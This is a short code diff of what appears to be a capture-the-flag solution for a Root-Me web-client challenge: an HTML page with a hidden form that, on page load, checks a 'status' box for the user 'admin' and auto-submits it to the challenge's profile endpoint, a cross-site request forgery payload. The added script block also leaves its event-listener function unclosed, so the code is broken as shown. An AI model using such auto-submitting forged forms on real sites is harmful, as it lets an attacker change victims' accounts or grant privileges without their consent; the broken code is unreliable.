@@ -1,9 +1,14 @@
 
 <form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST">
     <input type="text" name="username" value="admin">
-    <input type="checkbox" name="status" checked/>
+    <input type="checkbox" name="status"/>
 </form>
 <script>
-    
+
+    document.addEventListener("DOMContentLoaded", function() {
+        let checkbox = document.querySelector('input[name="status"]');
+        checkbox.removeAttribute("disabled"); // Supprime "disabled"
+        checkbox.checked = true; // Coche la case
+   
     document.forms[0].submit();
 </script>
